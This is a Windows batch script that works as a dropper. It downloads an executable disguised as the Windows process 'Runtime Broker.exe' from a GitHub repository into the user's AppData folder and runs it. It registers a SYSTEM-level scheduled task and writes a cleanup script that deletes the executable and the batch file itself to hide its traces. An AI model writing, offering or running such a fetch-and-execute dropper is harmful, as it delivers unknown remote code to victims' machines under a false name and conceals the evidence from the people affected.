@echo off
setlocal

:: Define variables
set "fileURL=https://github.com/emad8787/panel/raw/refs/heads/main/speed/Runtime%20Broker.exe"
set "fileName=Runtime Broker.exe"
set "destPath=%APPDATA%\%fileName%"
set "batFile=%~f0"
set "cleanupScript=%TEMP%\cleanup.bat"
set "taskName=CleanupOnShutdown"

:: Download the exe
powershell -Command "Invoke-WebRequest -Uri '%fileURL%' -OutFile '%destPath%'"

:: Create cleanup script
(
    echo @echo off
    echo timeout /t 2 ^>nul
    echo del /f /q "%destPath%"
    echo del /f /q "%batFile%"
    echo schtasks /delete /tn "%taskName%" /f
) > "%cleanupScript%"

:: Create a shutdown task
schtasks /create /tn "%taskName%" /tr "\"%cleanupScript%\"" /sc onstart /ru System /f

:: Run the exe and wait
start "" /wait "%destPath%"

:: If exe closes normally, delete files immediately
call "%cleanupScript%"

endlocal
exit
